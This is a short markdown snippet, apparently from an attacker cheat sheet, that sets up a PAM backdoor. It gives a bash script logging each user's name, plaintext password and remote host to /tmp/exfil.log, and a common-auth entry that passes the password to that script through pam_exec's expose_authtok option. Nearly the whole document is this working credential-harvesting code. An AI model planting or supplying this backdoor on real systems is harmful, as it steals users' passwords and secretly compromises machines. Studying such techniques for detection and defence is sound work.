## Script that will execute when user logs in via PAM

```sh
#!/bin/bash

echo "$(date) $PAM_USER, $(cat -), Host: $PAM_RHOST" >> /tmp/exfil.log
```

## Entry to add in /etc/pam.d/common-auth

```sh
auth	optional	pam_exec.so	quiet	expose_authtok	/tmp/pwn.sh
```
